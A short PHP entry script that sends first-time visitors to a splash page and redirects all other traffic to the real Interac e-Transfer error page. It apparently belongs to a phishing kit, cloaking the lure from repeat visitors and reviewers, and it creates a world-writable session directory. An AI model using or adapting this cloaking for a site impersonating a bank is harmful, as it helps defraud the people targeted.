<?php
// Prevent accidental output before headers
ob_start();

// --- Force writable session directory ---
$session_path = __DIR__ . '/sessions';
if (!is_dir($session_path)) {
    mkdir($session_path, 0777, true);
}
ini_set('session.save_path', $session_path);

// --- Start session safely ---
session_start();

// --- Interac error URL ---
define('ERROR_URL', 'https://etransfer.interac.ca/error');

// --- First time visitor? ---
if (empty($_SESSION['visited'])) {
    $_SESSION['visited'] = true;
    header('Location: splash.php');
    exit;
}

// --- Requested file check ---
$request     = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$full_path   = $_SERVER['DOCUMENT_ROOT'] . $request;

if (!file_exists($full_path) || is_dir($full_path)) {
    header("Location: " . ERROR_URL);
    exit;
}

// --- All other traffic ---
header("Location: " . ERROR_URL);
exit;

// End output buffer cleanly
ob_end_flush();